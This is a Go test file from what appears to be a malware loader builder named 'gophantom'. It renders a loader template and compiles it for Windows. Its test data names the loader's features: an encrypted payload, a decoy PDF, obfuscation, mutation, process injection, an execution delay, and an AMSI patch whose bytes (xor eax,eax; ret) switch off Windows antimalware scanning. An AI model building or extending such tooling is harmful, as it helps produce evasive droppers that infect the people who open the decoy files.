package main

import (
	"bytes"
	"encoding/base64"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"text/template"
)

// TestTemplateCompiles verifies that the embedded loader template renders
// with representative data and the result compiles for windows/amd64.
// This catches template syntax errors and Go compilation errors before release.
func TestTemplateCompiles(t *testing.T) {
	tmpl, err := template.New("loader.go.tmpl").ParseFS(templateFS, "templates/*.tmpl")
	if err != nil {
		t.Fatalf("template parse error: %v", err)
	}

	// 使用真实的字符串编码逻辑生成测试数据
	var testKey byte = 0x37
	testEncodedStrings := buildEncodedStrings(testKey)
	testAMSIPatch := base64.StdEncoding.EncodeToString([]byte{0x31, 0xC0, 0xC3})

	data := TemplateData{
		EncryptedPayload: "dGVzdA==",
		EncryptedDecoy:   "dGVzdA==",
		Salt:             "dGVzdHNhbHR0ZXN0c2FsdA==",
		DecoyFileName:    "test.pdf",
		EnableObfuscate:  true,
		EnableMutate:     true,
		EnableCompress:   true,
		EnableInject:     true,
		DelaySeconds:     5,
		StringKey:        testKey,
		EncodedStrings:   testEncodedStrings,
		AMSIPatch:        testAMSIPatch,
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, data); err != nil {
		t.Fatalf("template execute error: %v", err)
	}

	// Write rendered source to a temp build directory
	tmpDir, err := os.MkdirTemp("", "gophantom-test-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	goFile := filepath.Join(tmpDir, "loader.go")
	if err := os.WriteFile(goFile, buf.Bytes(), 0644); err != nil {
		t.Fatalf("failed to write rendered template: %v", err)
	}

	// Use embedded go.mod and go.sum
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(buildGoMod), 0644); err != nil {
		t.Fatalf("failed to write go.mod: %v", err)
	}
	if err := os.WriteFile(filepath.Join(tmpDir, "go.sum"), []byte(buildGoSum), 0644); err != nil {
		t.Fatalf("failed to write go.sum: %v", err)
	}

	// Compile for windows/amd64 — the only supported target
	outBin := filepath.Join(tmpDir, "loader.exe")
	cmd := exec.Command("go", "build", "-mod=mod", "-o", outBin, "-ldflags", "-s -w", "loader.go")
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(), "CGO_ENABLED=0", "GOOS=windows", "GOARCH=amd64")

	output, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("compilation failed:\n%s\nerror: %v", string(output), err)
	}

	// Verify the binary was actually produced
	info, err := os.Stat(outBin)
	if err != nil {
		t.Fatalf("output binary not found: %v", err)
	}
	if info.Size() == 0 {
		t.Fatal("output binary is empty")
	}

	t.Logf("compiled successfully: %s (%d bytes)", outBin, info.Size())
}
